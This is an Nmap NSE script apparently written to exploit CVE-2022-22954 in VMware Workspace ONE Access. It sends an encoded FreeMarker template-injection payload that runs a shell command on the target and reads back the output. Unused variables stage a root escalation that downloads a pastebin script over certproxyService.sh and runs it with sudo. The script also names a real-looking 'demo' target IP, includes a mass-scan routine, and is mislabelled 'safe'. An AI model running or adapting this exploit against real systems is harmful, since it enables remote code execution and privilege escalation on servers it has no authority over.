author = {"Mr_Hackux", " <hackuxe@gmail.com>","LUNIX Security"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local json = require "json"
local io = require "io"
local os = require "os"
local base64 = require "base64"
local math = require "math"

---
-- @usage nmap -sV --script vuln <target>
-- @usage nmap -p443 --script http-vuln-cve2022-22954.nse <target>
-- targets démo
-- 197.140.2.36:443

portrule = shortport.http

local clock = os.clock 
function sleep(n) 
local t = clock() 
while clock() - t <= n do end 
end

local function verify_vulnerability(host, port)

--[[root processus]]
local cmd1 = 'wget https://pastebin.com/Kbw60sxV' --output  /opt/vmware/certproxy/bin/certproxyService.sh' 
--local cmd1 = 'wget https://pastebin.com/2hpdEN0g -O  /opt/vmware/certproxy/bin/certproxyService.sh'
local cmd2 = 'cat /opt/vmware/certproxy/bin/certproxyService.sh'
local cmd3 = 'sudo /opt/vmware/certproxy/bin/certproxyService.sh'
local cmd = "id"

local tabstr = {}
local strenc = ""
local str, str2
local n = string.len(cmd)
for i=1,n do
str = string.format("%%%02x",string.byte(cmd,i))
table.insert(tabstr, str)
end

for k,v in pairs(tabstr) do
strenc = strenc..v
end
local cmd_enc = strenc

local payload = "%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22"..cmd_enc.."%22%29%7d"
--local payload = '${freemarker.template.utility.Execute?new()('..cmd..')}'

local uri = "/catalog-portal/ui/oauth/verify?error=&deviceUdid="..payload

local opts = {header={}}
opts["header"]["Host"] = 'localhost'

stdnse.debug1("[+] Scanning Host ..."..host.." \n")

local req = http.get(host, port, uri, opts, { verify=false}, "")
--print(req.body)
stdnse.debug1("[+]"..req["status-line"])

local vuln_table = {
title = "VMware Workspace ONE Access and Identity Manager RCE via SSTI.",
state = vulns.STATE.NOT_VULN,
risk_factor = "High",
description = [[
CVE-2022-22954 VMware Workspace ONE Access and Identity Manager RCE via SSTI
]],
references = {
'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22954',
'https://github.com/Chocapikk/CVE-2022-22954'
},
exploit_results = {},
}
local file_path = "/sdcard/Nmap/data/woa.html"
local file = io.open(file_path, "w")
local html = req.body
--print(html)
file:write(html)
-- Fermeture du fichier
 file:close()
local cmd_shell = string.match(string.gsub(req.body, "\\([nt])",{n="\n", t="\t"}), 'device id:.-;')

if cmd_shell then
table.insert(vuln_table.exploit_results, "Commande: ".. cmd.."\nResults: "..cmd_shell.." \n")
stdnse.debug1("[+] Target Vulnerable")
stdnse.debug1("[+]"..cmd_shell)
--vuln_table.state = vulns.STATE.VULN
else
stdnse.debug1("[-] Target Not Vulnerable")
end

--local report = vulns.Report:new(SCRIPT_NAME, host, port)
--print(report:make_output(vuln_table))
end



local function check_multiple_vulnerabilities(ips_file, result_file, port)
	local file1 = io.open(ips_file, "r")
    local file2 = io.open(result_file, "w")
	if not file1 then
		print("[-]Failed to open file: "..file1)
	end
   if not file2 then
		print("[-]Failed to open file: "..file2)
	end
   local results = {}
	for ip in file1:lines() do
		local success = pcall(verify_vulnerability, ip, port)

		if success then
          table.insert(results, "VULNERABLE : "..ip)
       else
          table.insert(results, "NOT VULNERABLE : "..ip)
  end
 end
       
        for _, ip in ipairs(results) do
          print(ip .. "\n")
			file2:write(ip .. "\n")
          file2:flush()
	end
   file1:close()
	file2:close()
end



action = function(host, port)

      local ips_file = "/sdcard/Nmap/data/vmwareips2.txt"
      local result_file = "/sdcard/Nmap/data/result.txt"
	   verify_vulnerability(host.ip, port.number)	
		--check_multiple_vulnerabilities(ips_file, result_file, port.number)
end